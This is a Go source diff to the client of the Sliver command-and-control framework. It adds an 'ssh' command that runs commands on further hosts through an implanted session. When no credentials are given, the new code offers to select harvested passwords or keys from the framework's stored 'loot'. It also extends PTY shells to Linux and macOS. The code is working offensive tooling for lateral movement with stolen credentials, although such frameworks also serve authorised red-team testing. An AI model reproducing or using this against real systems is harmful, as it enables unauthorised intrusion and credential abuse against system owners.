@@ -20,13 +20,20 @@ package command
 
 import (
 	"bufio"
+	"bytes"
 	"context"
+	"errors"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
 	"os"
+	"strings"
+	"text/tabwriter"
 
+	"github.com/AlecAivazis/survey/v2"
 	"github.com/bishopfox/sliver/client/core"
+	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/rpcpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 
@@ -36,6 +43,8 @@ import (
 
 const (
 	windows = "windows"
+	darwin  = "darwin"
+	linux   = "linux"
 )
 
 func shell(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
@@ -50,8 +59,8 @@ func shell(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 
 	shellPath := ctx.Flags.String("shell-path")
 	noPty := ctx.Flags.Bool("no-pty")
-	if ActiveSession.Get().OS == windows {
-		noPty = true // Windows of course doesn't have PTYs
+	if ActiveSession.Get().OS != linux && ActiveSession.Get().OS != darwin {
+		noPty = true // Sliver's PTYs are only supported on linux/darwin
 	}
 	runInteractive(ctx, shellPath, noPty, rpc)
 	fmt.Println("Shell exited")
@@ -123,4 +132,136 @@ func runInteractive(ctx *grumble.Context, shellPath string, noPty bool, rpc rpcp
 
 	log.Printf("Exit interactive")
 	bufio.NewWriter(os.Stdout).Flush()
+}
+
+func runSSHCmd(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
+	var (
+		privKey []byte
+		err     error
+	)
+	session := ActiveSession.GetInteractive()
+	if session == nil {
+		return
+	}
+
+	username := ctx.Flags.String("login")
+	if username == "" {
+		username = session.GetUsername()
+	}
+
+	port := ctx.Flags.Uint("port")
+	privateKeypath := ctx.Flags.String("private-key")
+	if privateKeypath != "" {
+		privKey, err = ioutil.ReadFile(privateKeypath)
+		if err != nil {
+			fmt.Printf(Warn+"Error: %s\n", err.Error())
+			return
+		}
+	}
+	password := ctx.Flags.String("password")
+
+	hostname := ctx.Args.String("hostname")
+	command := ctx.Args.StringList("command")
+
+	if password == "" && len(privKey) == 0 && !ctx.Flags.Bool("skip-loot") {
+		oldUsername := username
+		username, password, privKey = tryCredsFromLoot(rpc)
+		if username == "" {
+			username = oldUsername
+		}
+	}
+
+	commandResp, err := rpc.RunSSHCommand(context.Background(), &sliverpb.SSHCommandReq{
+		Username: username,
+		Hostname: hostname,
+		Port:     uint32(port),
+		PrivKey:  privKey,
+		Password: password,
+		Command:  strings.Join(command, " "),
+		Request:  ActiveSession.Request(ctx),
+	})
+	if err != nil {
+		fmt.Printf(Warn+"Error: %s\n", err.Error())
+		return
+	}
+
+	if commandResp.Response != nil && commandResp.Response.Err != "" {
+		fmt.Printf(Warn+"Error: %s\n", commandResp.Response.Err)
+		if commandResp.StdErr != "" {
+			fmt.Printf(Warn+"StdErr: %s\n", commandResp.StdErr)
+		}
+		return
+	}
+	if commandResp.StdOut != "" {
+		fmt.Println(Info + "Output:")
+		fmt.Println(commandResp.StdOut)
+		if commandResp.StdErr != "" {
+			fmt.Println(Info + "StdErr")
+			fmt.Println(commandResp.StdErr)
+		}
+	}
+}
+
+func tryCredsFromLoot(rpc rpcpb.SliverRPCClient) (string, string, []byte) {
+	var (
+		username string
+		password string
+		privKey  []byte
+	)
+	confirm := false
+	prompt := &survey.Confirm{Message: "No credentials provided, use from loot?"}
+	survey.AskOne(prompt, &confirm, nil)
+	if confirm {
+		loot, err := selectCredentials(rpc)
+		if err != nil {
+			fmt.Printf(Warn + "invalid loot data, will try to use the SSH agent")
+		} else {
+			switch loot.CredentialType {
+			case clientpb.CredentialType_API_KEY:
+				privKey = []byte(loot.Credential.APIKey)
+			case clientpb.CredentialType_USER_PASSWORD:
+				username = loot.Credential.User
+				password = loot.Credential.Password
+			}
+		}
+	}
+	return username, password, privKey
+}
+
+func selectCredentials(rpc rpcpb.SliverRPCClient) (*clientpb.Loot, error) {
+	allLoot, err := rpc.LootAllOf(context.Background(), &clientpb.Loot{
+		Type: clientpb.LootType_LOOT_CREDENTIAL,
+	})
+	if err != nil {
+		fmt.Printf(Warn+"%s\n", err)
+	}
+
+	// Render selection table
+	buf := bytes.NewBufferString("")
+	table := tabwriter.NewWriter(buf, 0, 2, 2, ' ', 0)
+	for _, loot := range allLoot.Loot {
+		fmt.Fprintf(table, "%s\t%s\t%s\t\n", loot.Name, loot.CredentialType, loot.LootID)
+	}
+	table.Flush()
+	options := strings.Split(buf.String(), "\n")
+	options = options[:len(options)-1]
+	if len(options) == 0 {
+		return nil, errors.New("no loot to select from")
+	}
+
+	selected := ""
+	prompt := &survey.Select{
+		Message: "Select a piece of credentials:",
+		Options: options,
+	}
+	err = survey.AskOne(prompt, &selected)
+	if err != nil {
+		return nil, err
+	}
+	for index, value := range options {
+		if value == selected {
+			return allLoot.Loot[index], nil
+		}
+	}
+	return nil, errors.New("loot not found")
 }
